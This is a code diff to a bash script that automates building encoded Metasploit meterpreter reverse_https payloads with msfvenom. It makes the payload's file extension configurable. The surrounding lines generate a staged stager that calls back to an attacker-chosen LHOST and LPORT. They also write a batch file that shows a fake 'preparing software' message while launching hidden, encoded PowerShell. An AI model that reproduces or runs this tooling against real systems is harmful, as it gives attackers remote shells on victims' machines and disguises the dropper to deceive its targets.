@@ -30,6 +30,7 @@
 V3R="1.2"                                   # Tool version release
 IPATH=`pwd`                                 # Store tool full install path
 ChEk_DB="OFF"                               # Rebuild msfdb database (postgresql)?
+DEFAULT_EXT="bat"                           # Default payload extension to use (bat|ps1|txt)
 ENCODE="x86/shikata_ga_nai"                 # Msf encoder to use to encode payload
 ENCODE_NUMB="3"                             # How many interactions to encode payload
 # __________________________________________|
@@ -254,11 +255,11 @@ fi
 #
 # Chose to build a staged (payload.bat) or a stageless (payload.exe) ..
 #
-BuIlD=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload categorie:" --radiolist --column "Pick" --column "Option" TRUE "staged (payload.bat)" FALSE "stageless (payload.exe)" --width 300 --height 160) > /dev/null 2>&1
+BuIlD=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload categorie:" --radiolist --column "Pick" --column "Option" TRUE "staged (payload.$DEFAULT_EXT)" FALSE "stageless (payload.exe)" --width 300 --height 160) > /dev/null 2>&1
 #
 # Staged payload build (batch output)
 #
-if [ "$BuIlD" = "staged (payload.bat)" ]; then
+if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   echo ${BlueF}[☠]${white} staged payload sellected ..${Reset};
   sleep 1
     #
@@ -269,13 +270,13 @@ if [ "$BuIlD" = "staged (payload.bat)" ]; then
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
     paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 220) > /dev/null 2>&1
-    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows -a x86 --smallest -e $ENCODE -i $ENCODE_NUMB -f psh-cmd -o paranoid-staged.bat
+    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows -a x86 --smallest -e $ENCODE -i $ENCODE_NUMB -f psh-cmd -o paranoid-staged.$DEFAULT_EXT
 
       #
       # head - paranoid-staged.bat
       #
-      str0=`cat $IPATH/output/paranoid-staged.bat | awk {'print $12'}`
-      rm $IPATH/output/paranoid-staged.bat > /dev/null 2>&1
+      str0=`cat $IPATH/output/paranoid-staged.$DEFAULT_EXT | awk {'print $12'}`
+      rm $IPATH/output/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
       # build trigger.bat template
       echo ${BlueF}[☠]${white} Building template ..${Reset};
       sleep 2
@@ -285,7 +286,7 @@ if [ "$BuIlD" = "staged (payload.bat)" ]; then
       echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/template.bat
       echo "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e $str0" >> $IPATH/output/template.bat
       echo "exit" >> $IPATH/output/template.bat
-      mv -f template.bat paranoid-staged.bat
+      mv -f template.bat paranoid-staged.$DEFAULT_EXT
       sleep 2
 
   # 
